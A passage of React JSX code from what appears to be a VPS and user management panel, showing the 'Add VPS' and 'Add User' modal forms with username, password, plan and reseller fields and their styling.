                                <label className="block text-white mb-2">Password</label>
                                <input
                                    type="password"
                                    value={vpsForm.password}
                                    onChange={(e) => setVpsForm({...vpsForm, password: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="password"
                                />
                            </div>
                        </div>
                        
                        <div className="flex justify-end space-x-3 mt-6">
                            <button
                                onClick={() => setShowVpsModal(false)}
                                className="px-4 py-2 bg-white bg-opacity-20 hover:bg-opacity-30 text-white rounded-lg transition-all duration-300"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={addVPS}
                                className="px-4 py-2 bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white rounded-lg font-semibold transition-all duration-300"
                            >
                                Add VPS
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* User Modal */}
            {showUserModal && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="glass-effect rounded-xl p-6 w-full max-w-md mx-4">
                        <div className="flex items-center justify-between mb-4">
                            <h2 className="text-xl font-bold text-white">Add User</h2>
                            <button
                                onClick={() => setShowUserModal(false)}
                                className="text-white opacity-60 hover:opacity-100"
                            >
                                <i className="fas fa-times"></i>
                            </button>
                        </div>
                        
                        <div className="space-y-4">
                            <div>
                                <label className="block text-white mb-2">Username</label>
                                <input
                                    type="text"
                                    value={userForm.username}
                                    onChange={(e) => setUserForm({...userForm, username: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white placeholder-white placeholder-opacity-60 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                                    placeholder="username"
                                />
                            </div>
                            
                            <div>
                                <label className="block text-white mb-2">Plan</label>
                                <select
                                    value={userForm.plan}
                                    onChange={(e) => setUserForm({...userForm, plan: e.target.value})}
                                    className="w-full px-4 py-2 rounded-lg bg-white bg-opacity-20 border border-white border-opacity-30 text-white focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 user-select"
                                >
                                    <option value="free">Free</option>
                                    <option value="premium">Premium</option>
                                    <option value="reseller">Reseller</option>
                                </select>
                            </div>
                            
                            <div className="flex items-center">
                                <input
                                    type="checkbox"
                                    checked={userForm.reseller}
                                    onChange={(e) => setUserForm({...userForm, reseller: e.target.checked})}
                                    className="user-checkbox"
                                />
                                <label className="text-white ml-2">Reseller Account</label>
                            </div>
                        </div>
                        
                        <div className="flex justify-end space-x-3 mt-6">
                            <button
                                onClick={() => setShowUserModal(false)}
                                className="px-4 py-2 bg-white bg-opacity-20 hover:bg-opacity-30 text-white rounded-lg transition-all duration-300"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={addUser}
                                className="px-4 py-2 bg-gradient-to-r from-blue-500 to-indigo-500 hover:from-blue-600 hover:to-indigo-600 text-white rounded-lg font-semibold transition-all duration-300"
                            >
                                Add User
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

ReactDOM.render(<KelvinVMXZ />, document.getElementById('root'));
